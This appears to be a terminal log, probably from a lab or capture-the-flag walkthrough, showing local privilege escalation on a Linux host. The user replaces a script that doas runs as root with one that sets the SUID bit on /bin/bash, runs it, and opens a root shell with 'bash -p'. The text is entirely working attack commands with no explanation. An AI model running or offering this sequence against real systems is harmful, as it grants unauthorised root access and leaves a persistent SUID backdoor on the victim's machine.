```shell
james@127:/tmp$ cd /usr/local/sbin
james@127:/usr/local/sbin$ mv systeminfo systeminfo.bak
james@127:/usr/local/sbin$ echo 'chmod u+s /bin/bash' > systeminfo
james@127:/usr/local/sbin$ chmod 755 systeminfo
james@127:/usr/local/sbin$ doas /usr/local/sbin/systeminfo
james@127:/usr/local/sbin$ /bin/bash -p
```